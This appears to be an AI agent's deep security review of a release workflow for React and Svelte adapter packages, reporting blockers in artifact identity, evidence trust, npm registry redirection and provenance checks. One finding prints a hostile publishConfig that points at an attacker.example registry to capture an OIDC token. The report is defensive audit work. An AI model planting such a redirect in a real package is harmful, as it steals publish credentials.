---
phase: 09-react-and-svelte-adapters
reviewed: 2026-08-11T10:09:15Z
depth: deep
iteration: 3
files_reviewed: 48
files_reviewed_list:
  - .changeset/bright-guides-connect.md
  - .changeset/config.json
  - .github/workflows/ci.yml
  - .github/workflows/release.yml
  - .gitignore
  - CONTRIBUTING.md
  - README.md
  - RELEASING.md
  - examples/adapter-ssr/astro.config.mjs
  - examples/adapter-ssr/package.json
  - examples/adapter-ssr/src/components/ReactIsland.tsx
  - examples/adapter-ssr/src/components/SvelteIsland.svelte
  - examples/adapter-ssr/src/pages/index.astro
  - examples/adapter-ssr/src/shared/catalog.ts
  - examples/adapter-ssr/test/ssr.test.ts
  - examples/adapter-ssr/tsconfig.json
  - package.json
  - packages/concierge/package.json
  - packages/concierge-react/README.md
  - packages/concierge-react/package.json
  - packages/concierge-react/src/client.tsx
  - packages/concierge-react/src/index.ts
  - packages/concierge-react/test-d/public.test-d.ts
  - packages/concierge-react/test/artifact.test.ts
  - packages/concierge-react/test/lifecycle.test.tsx
  - packages/concierge-react/tsconfig.json
  - packages/concierge-react/tsdown.config.ts
  - packages/concierge-svelte/README.md
  - packages/concierge-svelte/package.json
  - packages/concierge-svelte/src/client.svelte.ts
  - packages/concierge-svelte/src/index.ts
  - packages/concierge-svelte/svelte.config.js
  - packages/concierge-svelte/test/Harness.svelte
  - packages/concierge-svelte/test/artifact.test.ts
  - packages/concierge-svelte/test/lifecycle.test.ts
  - packages/concierge-svelte/tsconfig.json
  - pnpm-workspace.yaml
  - scripts/fixtures/phase-09-foreign-consumer/package-lock.json
  - scripts/fixtures/phase-09-foreign-consumer/package.json
  - scripts/phase-09-adapter-budget.mjs
  - scripts/phase-09-contract-check.mjs
  - scripts/phase-09-mutation-battery.mjs
  - scripts/phase-09-package-check.mjs
  - scripts/phase-09-publish-archives.mjs
  - scripts/phase-09-test-check.mjs
  - scripts/phase-09-version.mjs
  - scripts/phase-09-workflow-check.mjs
  - vitest.config.ts
findings:
  critical: 3
  warning: 1
  info: 0
  total: 4
status: issues_found
---

# Phase 09: Code Review Report — Iteration 3

**Reviewed:** 2026-08-11T10:09:15Z  
**Depth:** deep  
**Files Reviewed:** 48  
**Status:** issues_found

## Summary

The twelve defects from `09-REVIEW.md` and `09-REVIEW-2.md` remain fixed at the specific layers previously reported. Exact archives are now the only configured publish inputs, the write-authorized Changesets job no longer executes workspace dependencies, ordinary `0.0.0` evidence is non-authorizing, the clean sealer compares archive bytes to tracked release evidence, and the publisher has ordered partial-release recovery. The adapter, consumer-lock, logical-LOC, and per-file-test fixes also remain intact.

The resulting boundary is still not release-safe. Three blocking defects remain: artifacts and seals are not bound to `github.run_attempt`; dependency-produced evidence can be copied by the privileged apply path and become the sealer's own trust root; and the publisher lets package metadata or npm configuration redirect publication and the OIDC exchange away from npmjs. The resume path also treats the existence of provenance-shaped registry metadata as proof of the expected source identity without verifying the attestation.

The checked-in evidence correctly fails closed because it predates the versioned `0.1.0` transition. That is not authorization to regenerate it while these blockers remain.

## Prior Finding Disposition

| Source finding | Iteration-3 disposition |
|---|---|
| `09-REVIEW.md` CR-01 — verified archives were not published | Fixed: the workflow reaches only the exact sealed-archive publisher. |
| `09-REVIEW.md` CR-02 — Changesets invalidated its own evidence | Fixed: credential-free prepare and minimal apply form a coherent `0.1.0` transition. |
| `09-REVIEW.md` CR-03 — verification held OIDC authority | Fixed: only `publish` has `id-token: write`. |
| `09-REVIEW.md` CR-04 — Svelte captured stale initial props | Fixed: getters are read inside `$effect`, with rerender/teardown coverage. |
| `09-REVIEW.md` WR-01 — foreign consumer was unlocked/networked | Fixed: the committed lock is consumed with offline `npm ci`. |
| `09-REVIEW.md` WR-02 — regex literals defeated the LOC gate | Fixed: TypeScript trivia scanning and a negative control remain present. |
| `09-REVIEW.md` WR-03 — aggregate Vitest success hid skipped files | Fixed: every expected file must contain a non-empty, fully passing suite. |
| `09-REVIEW-2.md` CR-01 — package-directory publish bypass | Fixed: the root command and exact folded workflow command route only through the archive publisher. |
| `09-REVIEW-2.md` CR-02 — write token exposed to dependency battery | Fixed at execution time: apply does not install or run workspace code. The distinct authority-laundering path is CR-02 below. |
| `09-REVIEW-2.md` CR-03 — feature/`0.0.0` evidence authorized release | Fixed: publication requires versioned, nonzero, consumed-changeset evidence. |
| `09-REVIEW-2.md` CR-04 — colocated archive manifest self-authenticated | Fixed at archive transport: a clean job creates a content-addressed seal. The trust root fed into that seal remains defective under CR-02 below. |
| `09-REVIEW-2.md` WR-01 — partial publication could not resume | Fixed mechanically: exact existing bytes may be skipped and ambiguous results are requeried. Attestation identity remains incomplete under WR-01 below. |

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: Rerun attempts collide and are not part of release identity

**Classification:** BLOCKER  
**Files:**

- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/.github/workflows/release.yml:54-76,94-112,284-333,468-533,650-656`
- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/scripts/phase-09-version.mjs:432-447,512-523,640-669`
- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/scripts/phase-09-publish-archives.mjs:149-216,500-515`
- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/scripts/phase-09-workflow-check.mjs:787-900,923-986`

**Issue:** Every artifact name and every prepare/seal/publish identity binds `github.run_id` and `github.sha`, but none binds `github.run_attempt`. GitHub keeps `GITHUB_RUN_ID` and the commit constant when a run is rerun; only `GITHUB_RUN_ATTEMPT` increases. A full rerun therefore attempts to upload the same immutable v4 artifact names, including the content-addressed seal whose ID also omits the attempt. Those uploads can fail with a same-name conflict. A failed-job rerun can instead download artifacts created by an earlier attempt and still satisfy every current schema because the attempt is nowhere in the identity or expected environment. The workflow checker positively requires the deficient run-ID-only names, so it cannot detect this regression.

This behavior follows GitHub's documented [`GITHUB_RUN_ID`/`GITHUB_RUN_ATTEMPT` semantics](https://docs.github.com/en/actions/reference/workflows-and-actions/variables) and `upload-artifact@v4`'s [immutable, unique-name contract](https://github.com/actions/upload-artifact#not-uploading-to-the-same-artifact).

**Fix:** Add a required positive-integer `runAttempt` to the version artifact, release evidence identity, seal identity/body/digest, publisher expected bindings, and all exact-key checks. Include `${{ github.run_attempt }}` in every prepare, untrusted archive, publisher-tool, and sealed artifact name. Make the seal ID cover the attempt. Update the workflow checker and self-tests with negatives for a missing/mismatched attempt and a simulation proving attempt 2 cannot consume or overwrite attempt-1 artifacts.

### CR-02: Dependency-produced evidence is laundered through privileged apply into publication authority

**Classification:** BLOCKER  
**Files:**

- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/.github/workflows/release.yml:42-112,319-333,380-490`
- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/scripts/phase-09-version.mjs:53-64,573-610,697-817,824-883,894-961`
- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/scripts/phase-09-mutation-battery.mjs:1754-1810,1834-1908`

**Issue:** The unprivileged prepare job runs the complete workspace dependency/build/test/package battery, then puts all four generated mutation/release evidence files in the exact write allowlist. The later Changesets action does not execute dependencies, but it does copy those dependency-produced files into a repository-writing release PR. `validateEvidenceAuthorization()` gives the JSON files only a handful of top-level checks plus a recomputable self-hash; it does not validate their full schemas, release-input set, command/test results, or archive semantics. The Markdown ledgers need only a recomputable trailing hash.

That creates a direct authority-laundering chain: compromised build/package code can choose or alter archive outputs and the battery records those bytes as successful evidence; prepare packages those self-consistent claims; privileged apply commits them; the later clean sealer treats the committed archive hashes as its independent trust root. Reproducing the same malicious outputs in `verify` satisfies the seal. The clean job therefore prevents a post-seal byte swap but does not prevent dependency-written claims from authorizing the bytes in the first place.

The consumed-changeset binding has an additional concrete gap. Each `consumedChangesets[].sha256` is checked only for syntax, while a deletion operation independently checks `baseSha256` against the actual base file. No assertion requires the two digests to be equal, so an artifact can make a false exact-digest claim about the changeset it deleted and propagate that claim into release evidence and the seal.

**Fix:** Keep the privileged apply artifact semantic-only: exact package-version manifest transitions, bounded changelogs, and deletion of changesets whose recorded digest must equal the deletion operation's verified base digest. Do not allow mutation evidence, release evidence, validation, security ledgers, archive hashes, test claims, or `releaseAuthorization: true` to cross from a workspace-code-running job into a write-authorized PR. Derive final publication authorization after merge in a separate trusted/hermetic boundary that does not execute workspace code and does not treat child-writable files as its trust root; dependency invocations must be isolated and terminated before immutable outputs are sealed. If any evidence remains in the artifact, validate the complete exact schemas and independently recompute every source-derived field rather than accepting self-hashes. Add coordinated malicious-evidence and consumed-digest-mismatch negatives.

### CR-03: Tarball metadata can redirect the npm OIDC exchange and publish destination

**Classification:** BLOCKER  
**Files:**

- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/scripts/phase-09-publish-archives.mjs:300-327,395-463,466-497`
- `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/.github/workflows/release.yml:650-662`

**Issue:** Archive inspection checks only package name, version, `private`, filename, and digests. Both production `npm view` and `npm publish` omit an explicit `--registry`, and the environment gate does not reject registry overrides. Pinned npm 11.11.0 applies a tarball manifest's `publishConfig` to publish options unless a CLI option overrides it. It then selects the registry from those options, requests a GitHub OIDC token whose audience is that registry host, and sends the bearer to that registry's OIDC exchange endpoint. The pinned implementation documents both behaviors in [`publish.js`](https://github.com/npm/cli/blob/v11.11.0/lib/commands/publish.js#L268-L280) and [`oidc.js`](https://github.com/npm/cli/blob/v11.11.0/lib/utils/oidc.js#L72-L126).

A sealed archive containing `"publishConfig":{"registry":"https://attacker.example/"}` therefore passes this publisher, queries npmjs as missing, then directs the publish request and newly minted OIDC credential to the attacker-controlled registry. The eventual post-publish npmjs query may fail, but the credential disclosure and unauthorized external side effect have already occurred. Ambient `npm_config_registry` or user configuration can also make registry selection differ from the reviewed workflow.

**Fix:** Pass an exact `--registry=https://registry.npmjs.org/` to every `npm view` and `npm publish`, and make the publisher reject nonempty registry/auth overrides including `npm_config_registry`, `NPM_ID_TOKEN`, and an unexpected npm user config. Require each tarball's `publishConfig` to have the exact allowlisted shape `{ "access": "public" }` and validate the expected repository metadata used by npm provenance. Add a synthetic sealed-tarball negative with a hostile `publishConfig.registry` and assert that no network/publish client is invoked.

## Warnings

### WR-01: Resume trusts provenance-shaped metadata without verifying source identity

**Classification:** WARNING  
**File:** `/Users/lakshman/conductor/workspaces/concierge-v1/ljubljana/scripts/phase-09-publish-archives.mjs:362-391,518-560`  
**Issue:** Safe resume accepts an existing version when its integrity matches and `dist.attestations.url` has an npm-looking prefix plus the expected predicate-type string. It neither retrieves nor verifies the signed attestation and does not require its source repository, commit, workflow file, or build identity to match the current seal. Consequently, an exact-byte version published by another build in the same repository can be reported as a successful resume even though the current run's provenance was never established. The prefix test also is not an exact URL-origin/path validation.

**Fix:** Pin the query to npmjs, fetch the exact attestation bundle, verify its signature with a pinned verifier, and require subject name/integrity plus source repository, commit, and workflow identity to match the seal. At minimum, parse and compare an exact HTTPS origin/path rather than using `startsWith`. Add negatives for correct bytes with foreign repository, commit, workflow, predicate, and unsigned/fabricated metadata. npm's [provenance documentation](https://docs.npmjs.com/generating-provenance-statements/) distinguishes displaying provenance metadata from signature/attestation verification.

## Boundary Checks That Passed

- All GitHub Actions remain pinned to full commit SHAs; checkout uses the exact release commit with credentials not persisted.
- Job permissions remain narrow, and only `publish` has `id-token: write`.
- Prepare begins from a clean exact `HEAD`, writes only its enumerated operations, apply accepts an exact operation/blob set, no-op artifacts contain only the manifest, and the write-authorized job runs no workspace child command.
- The publisher tool and npm CLI are downloaded by content-addressed artifacts and rehashed before use; no alternate configured package-directory publish path remains.
- The exact archive triplet is ordered core, React, Svelte; input files are rehashed around each registry operation; ambiguous publication is requeried.
- Svelte lifecycle reactivity, foreign-consumer lock/offline use, logical-LOC scanner, and per-test-file positive assertion controls remain fixed.

## Verification Performed

- `node --check` passed for the version, mutation, publisher, and workflow scripts.
- `node scripts/phase-09-version.mjs self-test` — 13 controls passed.
- `node scripts/phase-09-version.mjs simulate` — planned shared version `0.1.0`, consumed one changeset, preserved `workspace:^`, and modified only its temporary snapshot.
- `node scripts/phase-09-mutation-battery.mjs self-test` — 22 controls passed.
- `node scripts/phase-09-publish-archives.mjs selftest` — 9 controls passed.
- `node scripts/phase-09-package-check.mjs selftest` — 7 controls passed.
- `node scripts/phase-09-adapter-budget.mjs selftest` — passed.
- `node scripts/phase-09-workflow-check.mjs` — 2 workflows, 7 jobs, 15 controls, 19 CI steps, and 40 release steps passed.
- `pnpm exec changeset status` — all three public packages plan a minor release.
- `pnpm --filter @fullselfbrowsing/concierge-svelte typecheck` — 0 errors and 0 warnings.
- `node scripts/phase-09-mutation-battery.mjs verify all` — failed closed because the checked-in mutation evidence is not marked `feature` or `versioned`, as expected before authorized regeneration.
- `git diff --check` — passed.

No production prepare/apply, terminal mutation `run all`, release battery, live publish, or npm publication command was executed. Existing unrelated changes to `.planning/config.json` and `examples/adapter-ssr/.astro/` were not touched.

## Post-review Authorization Verdict

**Not authorized.** Local credential-free `0.1.0` preparation or evidence finalization must not be run next. Fix CR-01 through CR-03, add the corresponding adversarial controls, and perform another clean review first. The current `simulate` result shows that a coherent `0.1.0` transition is possible; it does not establish a safe release boundary or authorize mutation of the checked-in evidence.

---

_Reviewed: 2026-08-11T10:09:15Z_  
_Reviewer: the agent (gsd-code-reviewer)_  
_Depth: deep_
